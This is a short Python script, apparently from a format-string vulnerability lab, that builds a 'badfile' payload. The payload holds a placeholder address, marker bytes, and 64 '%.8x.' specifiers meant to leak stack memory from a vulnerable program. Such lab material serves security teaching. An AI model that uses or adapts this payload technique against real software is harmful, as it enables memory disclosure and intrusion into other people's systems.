#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# Fill the content with NOP's
# content = bytearray(0x90 for i in range(N))

number  = 0xdeadbeef
content[0:4]  =  (number).to_bytes(4,byteorder='little')

content[4:8]  =  ("abcd").encode('latin-1')

s = "%.8x."*64

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

sys.stdout.buffer.write(content)